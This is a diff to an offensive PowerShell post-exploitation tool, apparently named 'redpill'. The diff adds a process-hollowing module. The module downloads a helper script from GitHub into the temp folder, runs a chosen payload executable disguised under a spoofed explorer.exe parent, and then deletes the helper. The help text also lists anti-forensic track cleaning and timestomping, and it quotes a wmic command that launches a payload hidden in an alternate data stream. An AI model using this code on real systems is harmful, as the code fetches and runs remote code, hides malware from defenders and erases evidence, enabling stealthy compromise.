@@ -81,8 +81,9 @@
    [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
    [string]$Extension="false", [string]$FilePath="false",
-   [int]$SPort='8080', [int]$ButtonType='0',
-   [string]$MetaData="false"
+   [string]$MetaData="false", [int]$ButtonType='0',
+   [int]$SPort='8080', [string]$PEHollow="false",
+   [string]$Sponsor="false"
 )
 
 
@@ -155,7 +156,8 @@ $ListParameters = @"
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
   -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
-  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject} 
+  -PEHollow         `$Env:TMP\test.exe    PE Process Hollowing {impersonate explorer.exe as parent}
+  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject}
   -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
   -PingSweep        Enum|Verbose         Enumerate active IP Addr (and ports) of Local Lan
   -NetTrace         Enum                 Agressive sytem enumeration with netsh {native}
@@ -1776,6 +1778,100 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
 }
 
 
+If($PEHollow -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @FuzzySecurity|@r00t-3xp10it
+      Helper - Process Hollowing with powershell
+
+   .DESCRIPTION
+      This Module uses PowerShell to create a Hollow from a PE
+      on disk with explorer as the parent. Credits: @FuzzySecurity
+
+   .NOTES
+      Supported Platforms: Windows
+
+   .Parameter PEHollow
+      Accepts the executable {payload.exe} absoluct \ relative path
+
+   .Parameter Sponsor
+      Accepts impersonate ProcessName executable absoluct \ relative path
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PEHollow "$Env:TMP\Payload.exe" -Sponsor "$Env:WINDIR\explorer.exe"
+      Spawns Payload.exe {child} as explorer.exe parent process in task manager
+
+   .OUTPUTS
+      VERBOSE: [?] A place where souls may mend your ailing mind..
+      VERBOSE: [+] Opened file for access
+      VERBOSE: [+] Created section from file handle
+      VERBOSE: [+] Opened handle to the parent => explorer
+      VERBOSE: [+] Created process from section
+      VERBOSE: [+] Acquired PBI
+      VERBOSE: [+] Sponsor architecture is x64
+      VERBOSE: [+] Sponsor ImageBaseAddress => 7FF6AB340000
+      VERBOSE: [+] Allocated space for the Hollow process
+      VERBOSE: [+] Duplicated Hollow PE headers to the Sponsor
+      VERBOSE: [+] New process ImageBaseAddress => 40000000
+      VERBOSE: [+] Created Hollow process parameters
+      VERBOSE: [+] Allocated memory in the Hollow
+      VERBOSE: [+] Process parameters duplicated into the Hollow
+      VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
+      VERBOSE: [+] Created Hollow main thread..
+   #>
+
+   ## Download Start-Hollow.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\Start-Hollow.ps1")){## Download Start-Hollow.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-Hollow.ps1 -Destination $Env:TMP\Start-Hollow.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\Start-Hollow.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 26){## Corrupted download detected => DefaultFileSize: 26,5634765625/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+
+   ## Set default values in case user miss it
+   If(-not($Sponsor) -or $Sponsor -ieq "false"){
+       $Sponsor = "$Env:WINDIR\explorer.exe" ## Impersonate ProcessName
+   }
+
+   ## Make sure ALL dependencies are present
+   If(-not(Test-Path -Path "$Sponsor" -EA SilentlyContinue)){
+       echo "`n[error] Not found: $Sponsor" > $Env:TMP\jhfdsjk.log
+       echo "Please sellect an diferent ProcessName Path!`n" >> $Env:TMP\jhfdsjk.log
+       Get-Content -Path "$Env:TMP\jhfdsjk.log"
+       Remove-Item -Path "$Env:TMP\jhfdsjk.log" -Force
+       exit ## Exit @redpill
+   }
+
+   If(-not(Test-Path -Path "$PEHollow" -EA SilentlyContinue)){
+       echo "`n[error] Not found: $PEHollow" > $Env:TMP\jhfdsjk.log
+       echo "Using PEHollow   : $Env:WINDIR\System32\cmd.exe" >> $Env:TMP\jhfdsjk.log
+       $PEHollow = "$Env:WINDIR\System32\cmd.exe" ## Payload.exe to spawn
+       Get-Content -Path "$Env:TMP\jhfdsjk.log"
+       Remove-Item -Path "$Env:TMP\jhfdsjk.log" -Force
+       Start-Sleep -Seconds 1
+   }
+
+   ## Get the -Sponsor {impersonate ProcessName} $PID
+   $ParseData = $Sponsor.Split('\\')[-1] ## extract ProcessName from path
+   $RawSponsor = $ParseData -replace '.exe','' ## extract ProcessName extension
+   $ppid = (Get-Process "$RawSponsor" -EA SilentlyContinue).id
+
+   ## Run auxiliary module
+   cd $Env:TMP;Import-Module .\Start-Hollow.ps1
+   Start-Hollow -Hollow "$PEHollow" -Sponsor "$Sponsor" -ParentPID "$ppid" -Verbose
+   cd $Working_Directory ## Return to redpill working directory
+
+   ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
+}
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -2758,6 +2854,49 @@ $HelpParameters = @"
       [cmd prompt] AccessHiddenData
       -----------------------------
       wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "PEHollow" -or $Help -ieq "Sponsor"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @FuzzySecurity|@r00t-3xp10it
+      Helper - Process Hollowing with powershell
+
+   .DESCRIPTION
+      This Module uses PowerShell to create a Hollow from a PE
+      on disk with explorer as the parent. Credits: @FuzzySecurity
+
+   .NOTES
+      Supported Platforms: Windows
+
+   .Parameter PEHollow
+      Accepts the executable {payload.exe} absoluct \ relative path
+
+   .Parameter Sponsor
+      Accepts impersonate ProcessName executable absoluct \ relative path
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PEHollow "`$Env:TMP\Payload.exe" -Sponsor "`$Env:WINDIR\explorer.exe"
+      Spawns Payload.exe {child} as explorer.exe parent process in task manager
+
+   .OUTPUTS
+      VERBOSE: [+] Opened file for access
+      VERBOSE: [+] Created section from file handle
+      VERBOSE: [+] Opened handle to the parent => explorer
+      VERBOSE: [+] Created process from section
+      VERBOSE: [+] Sponsor architecture is x64
+      VERBOSE: [+] Sponsor ImageBaseAddress => 7FF6AB340000
+      VERBOSE: [+] Allocated space for the Hollow process
+      VERBOSE: [+] Duplicated Hollow PE headers to the Sponsor
+      VERBOSE: [+] New process ImageBaseAddress => 40000000
+      VERBOSE: [+] Created Hollow process parameters
+      VERBOSE: [+] Allocated memory in the Hollow
+      VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
+      VERBOSE: [+] Created Hollow main thread..
    #>!bye..
 
 "@;
